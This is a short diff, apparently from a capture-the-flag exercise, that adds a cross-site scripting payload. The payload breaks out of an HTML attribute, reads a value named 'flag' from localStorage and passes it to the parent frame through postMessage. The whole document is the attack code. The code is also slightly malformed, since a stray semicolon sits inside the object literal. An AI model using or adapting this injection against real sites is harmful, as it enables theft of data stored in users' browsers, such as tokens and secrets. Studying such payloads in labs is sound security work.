@@ -1,0 +1,6 @@
+"><script>
+window.parent.postMessage({
+        type: "list",
+        list: localStorage.getItem('flag');
+    }, location.origin);
+</script>
